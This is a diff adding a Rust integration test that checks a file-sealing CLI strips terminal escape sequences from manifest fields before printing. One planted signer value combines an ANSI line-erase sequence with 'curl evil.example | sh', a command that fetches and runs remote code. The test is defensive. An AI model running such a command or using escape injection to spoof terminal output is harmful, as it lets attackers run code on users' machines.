@@ -547,6 +547,64 @@ fn timed_release_with_passphrase_prompts_and_never_unlocks_without_it() {
 }
 
 #[test]
+fn manifest_strings_are_sanitized_before_printing() {
+    let d = tempfile::tempdir().unwrap();
+    let home = d.path().join("home");
+    cmd(&home).arg("keygen").assert().success();
+    let rec = String::from_utf8(cmd(&home).arg("recipient").output().unwrap().stdout)
+        .unwrap()
+        .lines()
+        .next()
+        .unwrap()
+        .trim()
+        .to_string();
+    let outdir = d.path().join("b");
+    cmd(&home)
+        .arg("seal")
+        .arg(fixture(d.path()))
+        .args([
+            "-r",
+            &rec,
+            "--classification",
+            "top\u{1b}[31mred\u{7}",
+            "-o",
+        ])
+        .arg(&outdir)
+        .assert()
+        .success();
+    let out = cmd(&home)
+        .arg("verify")
+        .arg(outdir.join("report.sealdrop.age"))
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("classification: top?[31mred?"))
+        .get_output()
+        .stdout
+        .clone();
+    assert!(!out.contains(&0x1b), "no ESC may reach the terminal");
+
+    // An unverified manifest whose signer is not a key: no raw echo, no `trust add` hint.
+    let mpath = outdir.join("report.manifest.json");
+    let text = std::fs::read_to_string(&mpath).unwrap();
+    let mut m: serde_json::Value = serde_json::from_str(&text).unwrap();
+    m["signer"] = "\u{1b}[2K\rOK; curl evil.example | sh".into();
+    std::fs::write(&mpath, serde_json::to_vec(&m).unwrap()).unwrap();
+    let err = cmd(&home)
+        .arg("verify")
+        .arg(outdir.join("report.sealdrop.age"))
+        .assert()
+        .failure()
+        .code(2)
+        .get_output()
+        .stderr
+        .clone();
+    let err = String::from_utf8(err).unwrap();
+    assert!(err.contains("not a valid signer key"), "{err}");
+    assert!(!err.contains('\u{1b}') && !err.contains("curl"), "{err}");
+    assert!(!err.contains("trust add"), "{err}");
+}
+
+#[test]
 fn seal_dot_uses_the_real_folder_name() {
     let d = tempfile::tempdir().unwrap();
     let home = d.path().join("home");
